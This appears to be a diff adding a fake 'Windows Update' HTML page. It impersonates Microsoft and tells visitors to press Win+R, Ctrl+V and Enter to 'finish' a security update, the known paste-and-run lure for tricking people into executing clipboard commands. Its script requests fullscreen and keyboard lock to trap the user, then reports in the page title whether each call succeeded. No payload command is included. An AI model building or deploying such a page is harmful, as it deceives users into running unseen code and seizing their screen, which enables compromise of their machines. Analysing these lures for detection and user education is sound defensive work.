@@ -1,0 +1,30 @@
+<!doctype html>
+<html>
+  <head>
+    <meta charset="utf-8" />
+    <title>Windows Update</title>
+  </head>
+  <body style="background: #0078d7; color: #fff; font-family: system-ui">
+    <h1>Working on updates 30% complete. Don't turn off your computer.</h1>
+    <p>A critical security update needs confirmation. Press Win + R, then Ctrl + V and press Enter to finish.</p>
+    <button id="go">Continue</button>
+    <script>
+      document.getElementById('go').addEventListener('click', async () => {
+        const results = [];
+        try {
+          await document.documentElement.requestFullscreen();
+          results.push('fullscreen ok');
+        } catch (e) {
+          results.push('fullscreen ' + e.name);
+        }
+        try {
+          if (navigator.keyboard) await navigator.keyboard.lock();
+          results.push('lock ok');
+        } catch (e) {
+          results.push('lock ' + e.name);
+        }
+        document.title = results.join(', ');
+      });
+    </script>
+  </body>
+</html>
